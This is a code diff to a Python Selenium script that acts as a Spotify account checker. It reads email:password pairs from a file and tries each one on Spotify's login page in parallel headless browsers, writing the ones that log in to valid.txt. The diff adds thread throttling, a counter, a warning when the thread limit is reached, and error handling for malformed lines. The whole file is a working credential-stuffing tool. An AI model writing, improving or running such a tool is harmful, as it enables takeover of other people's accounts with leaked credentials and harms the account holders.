@@ -1,4 +1,4 @@
-import os,time,threading
+import os,time,threading,sys
 try:
     import colorama
     from colorama import Fore,Style
@@ -10,20 +10,26 @@ except:
     os.system("pip install -r requirements.txt")
 
 
-#STATIC CONFIGS
-CURRENT_THREADS = 0 # DO NOT MODIFY
+#STATIC CONFIGS **DO NOT MODIFY**
+COUNTER = 0
+CURRENT_THREADS = 0
 colorama.init(autoreset=True)
-
+WARN = False
 #PROGRAM CONFIGS#
-MAX_THREADS = 5
-ACCOUNT_FILE_NAME = "accounts.txt"
+MAX_THREADS = 10
+MAX_THREADS_DELAY = 1
+ACCOUNT_FILE_NAME = "test.txt"
 SEPARATED_BY = ":"
 OUTPUT_FILE = "valid.txt"
-LOG_LEVEL = 1  # 1 - Will print what account its checking and it will say whether its valid or not.
+SHOW_COUNTER = True
+LOG_LEVEL = 1  # 1 - Will print what account its checking and it will say whether its valid or not and will warn when max threads is reached.
                # 2 - Will print only if its valid or not.
                # 3 - Won't print nothing.
 class Program():
-    def __init__(self,email,passw):
+    def __init__(self,email,passw,current,account):
+        global CURRENT_THREADS
+        self.CURRENT_ACCOUNT = account
+        self.CURRENT_COUNT = current
         self.login = "https://accounts.spotify.com/login"
         options = selenium.webdriver.ChromeOptions()
         options.add_argument("--headless")
@@ -41,9 +47,13 @@ class Program():
         self.Driver = selenium.webdriver.Chrome(options=options)
         self.Driver.get(self.login)
 
-        self.username_space = self.Driver.find_element(By.ID,"login-username")
-        self.password_space = self.Driver.find_element(By.ID,"login-password")
-        self.login_button = self.Driver.find_element(By.ID,"login-button")
+        try:
+            self.username_space = self.Driver.find_element(By.ID,"login-username")
+            self.password_space = self.Driver.find_element(By.ID,"login-password")
+            self.login_button = self.Driver.find_element(By.ID,"login-button")
+        except:
+            CURRENT_THREADS -= 1
+            return
 
         self.login = self.Driver.current_url
         self.TryAccount(email,passw)
@@ -57,12 +67,12 @@ class Program():
         self.login_button.click()
         time.sleep(1)
         if self.Driver.current_url != self.login:
-            if LOG_LEVEL == 1 or LOG_LEVEL == 2:
-                print("{0}VALID! {1}:{2}".format(Fore.GREEN,email,passw))
-            self.Save(account)
+            if LOG_LEVEL == 1 or LOG_LEVEL == 2: 
+                print("{0}VALID! {1}:{2} {3}{4}#{5}".format(Fore.GREEN,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
+            self.Save(self.CURRENT_ACCOUNT)
         else:
             if LOG_LEVEL == 1 or LOG_LEVEL == 2:
-                print("{0}INVALID! {1}:{2}".format(Fore.RED,email,passw))
+                print("{0}INVALID! {1}:{2} {3}{4}#{5}".format(Fore.RED,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
         time.sleep(0.5)
         CURRENT_THREADS -= 1
         self.Driver.close()
@@ -72,16 +82,28 @@ class Program():
             file.write("\n"+content)
 
 with open(ACCOUNT_FILE_NAME, "r") as file:
-    accounts = file.readlines()
+    try:
+        accounts = file.readlines()
+    except UnicodeDecodeError:
+        print(f"{Fore.RED}Can't decode byte in file. Invalid File.")
+        sys.exit()
 
 for account in accounts:
-    email, password = account.strip().split(SEPARATED_BY)
+    try:
+        email, password = account.strip().split(SEPARATED_BY)
+    except:
+        print(f"{Fore.RED}Invalid organization in this account: "+account)
+        continue
     
     while CURRENT_THREADS >= MAX_THREADS:
-        time.sleep(1)
+        time.sleep(MAX_THREADS_DELAY)
+        print(f"{Fore.RED}MAX THREADS REACHED.." if not WARN and LOG_LEVEL == 1 else '')
+        WARN = True
     
-    thread = threading.Thread(target=Program, args=(email, password))
+    WARN = False
+    COUNTER += 1
+    
+    thread = threading.Thread(target=Program, args=(email, password,COUNTER,account))
     thread.start()
-    
     CURRENT_THREADS += 1
     continue
